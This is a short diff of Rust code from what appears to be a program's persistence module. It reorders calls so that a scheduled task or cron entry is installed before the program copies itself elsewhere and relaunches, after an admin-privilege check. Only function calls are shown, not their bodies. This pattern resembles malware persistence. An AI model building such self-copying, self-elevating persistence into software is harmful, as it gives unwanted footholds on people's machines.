@@ -8,14 +8,16 @@ impl PersistenceManager {
             Self::ensure_admin();
         }
 
+        // Install scheduled task / cron first (before copy_and_relaunch which exits)
+        if enable_persistence {
+            Self::install_persistence();
+        }
+
+        // Copy to safe location and relaunch (exits process on success)
         if let Some(path) = copy_to_path {
             if !path.is_empty() {
                 Self::copy_and_relaunch(path);
             }
-        }
-
-        if enable_persistence {
-            Self::install_persistence();
         }
     }
 
